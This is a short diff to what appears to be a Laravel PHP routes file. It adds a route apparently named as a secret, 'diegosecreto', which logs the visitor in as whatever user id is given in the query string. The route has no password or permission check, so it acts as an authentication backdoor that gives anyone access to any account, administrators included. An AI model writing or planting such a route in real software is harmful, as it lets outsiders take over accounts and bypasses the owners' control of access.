@@ -1,6 +1,11 @@
 <?php
 
 Route::get('teste/{id}', 'Admin\TransactionsController@show');
+Route::get('diegosecreto', function(){
+
+	Auth::loginUsingId(Input::get('id'));
+
+});
 
 // view composers
 View::composer('championships.partials.filters', 'Champ\Composers\CompetitionFilterComposer');
